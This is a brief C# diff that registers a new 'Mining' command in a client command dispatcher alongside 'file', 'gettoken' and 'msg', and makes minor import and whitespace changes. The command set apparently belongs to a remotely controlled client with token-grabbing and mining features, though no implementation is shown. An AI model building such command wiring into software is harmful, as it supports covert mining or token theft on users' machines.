@@ -1,4 +1,5 @@
-﻿using System.Collections.Generic;
+using System;
+using System.Collections.Generic;
 using System.Linq;
 
 namespace Client.Commands
@@ -16,6 +17,7 @@ namespace Client.Commands
             this.commands.Add(new File("file"));
             this.commands.Add(new getToken("gettoken"));
             this.commands.Add(new Message("msg"));
+            this.commands.Add(new Mining("Mining"));
         }
 
         public string runCommand(string cmd)
@@ -23,6 +25,9 @@ namespace Client.Commands
             string[] sp = cmd.Split(' ');
             string name = sp.First();
             string[] args = sp.Skip(1).ToArray();
+
+            
+
 
             foreach (Command c in this.commands)
             {
